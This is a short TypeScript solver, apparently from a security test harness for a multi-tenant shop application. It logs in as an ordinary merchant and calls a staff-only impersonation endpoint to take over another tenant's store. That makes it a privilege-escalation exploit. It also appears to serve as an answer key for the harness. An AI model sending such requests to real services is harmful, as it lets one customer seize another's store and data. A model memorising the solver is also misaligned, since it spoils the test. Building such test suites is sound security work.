// Invoke the staff-only impersonation action as an ordinary merchant to assume another store's scope.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const target = ctx.plan.personas.persona_b?.tenant ?? ''
  await ctx.fetch(buildPath(ctx.plan, 'adminImpersonate'), {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ store: target }),
  })
}
